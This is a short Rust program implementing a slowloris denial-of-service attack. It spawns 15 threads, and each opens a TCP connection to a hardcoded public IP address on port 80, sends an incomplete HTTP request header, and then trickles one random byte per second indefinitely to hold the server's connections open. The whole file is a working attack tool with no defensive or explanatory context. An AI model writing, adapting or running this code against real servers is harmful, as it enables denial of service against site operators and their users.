use rand::rngs::SmallRng;
use rand::FromEntropy;
use rand::Rng;
use std::io::prelude::*;
use std::net::TcpStream;
use std::time::Duration;
use std::thread;
use scoped_threadpool::Pool;

fn infinite_worker(num: u8, sleep_time: u8) {
    println!("[slowloris_{}] Spawned.", num);

    let mut stream = TcpStream::connect("142.251.32.100:80").expect("Connection failed.");

    match stream.write_all("GET / HTTP/1.1\r\nUser-Agent: slowloris\r\n".as_bytes()) {
        Ok(_) => println!("[slowloris_{}] Header sent.", num),
        Err(_) => println!("[slowloris_{}] Header failed.", num),
    }

    let mut rng = SmallRng::from_entropy();

    loop {
        thread::sleep(Duration::from_secs(sleep_time as u64));
        match stream.write_all(&rng.gen::<[u8; 1]>()) {
            Ok(_) => println!("[slowloris_{}] Update sent.", num),
            Err(_) => println!("[slowloris_{}] Update failed.", num),
        }
    }
}

fn main() {
    const NUM_THREADS: u8 = 15;
    const SECONDS: u8 = 1;

    let mut pool = Pool::new(NUM_THREADS as u32);
    pool.scoped(|scoped| {
        for i in 0..NUM_THREADS {
            scoped.execute(move || {
                infinite_worker(i, SECONDS);
            });
        }
    });
}
